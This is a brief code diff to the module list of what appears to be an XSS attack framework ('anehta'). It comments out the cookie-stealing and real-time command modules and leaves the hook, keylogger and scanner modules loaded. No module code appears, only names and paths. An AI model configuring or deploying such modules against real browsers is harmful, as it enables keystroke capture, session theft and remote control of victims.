@@ -17,10 +17,10 @@ var anehtaFeeds = [
   //{name: "DdosMod", url: "/module/ddos.js"},
   {name: "HookMod", url: "/module/hook.js"},
   {name: "KeyloggerMod", url: "/module/keylog.js"},
-  {name: "XCookieMod", url: "/module/xcookie.js"},
+  //{name: "XCookieMod", url: "/module/xcookie.js"},
   //{name: "CookieDemoMod", url: "/module/demo/cookieDemo.js"},
   //{name: "CacheDemoMod", url: "/module/demo/cacheDemo.js"},
-  {name: "RealtimeCmdMod", url: "/module/realtimecmd.js"},
+  //{name: "RealtimeCmdMod", url: "/module/realtimecmd.js"},
   {name: "ScannerMod", url: "/module/scanner.js"},
   {name: "TestMod", url: "/module/test.js"}
 ];
